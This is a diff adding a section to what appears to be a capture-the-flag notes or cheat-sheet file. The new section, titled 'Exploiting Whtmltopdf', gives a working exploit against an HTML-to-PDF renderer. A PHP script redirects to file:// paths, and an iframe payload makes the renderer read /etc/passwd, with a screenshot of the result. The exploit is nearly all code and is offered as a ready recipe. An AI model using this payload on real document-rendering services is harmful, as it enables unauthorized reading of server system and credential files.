@@ -4250,5 +4250,26 @@ Host: wonka.chal.cyberjousting.com
 
 ------------------------
 
+### Exploiting Whtmltopdf
 
+------------------------
 
+- Set up a php server hosting this code as index.php-:
+
+```
+<?php header('location:file://'.$_REQUEST['x']); ?>
+```
+
+- Also, create an index.html to load index.php as an iframe.
+
+```html
+<iframe src=http://<ip>/test.php?x=/etc/passwd width=1000px height=1000px></iframe>
+```
+
+- Url should be-: <urll>/index.html
+
+- Result-:
+
+![image](https://github.com/user-attachments/assets/e6f56e17-9c7b-4276-8c35-cfba104f1f89)
+
+---------------
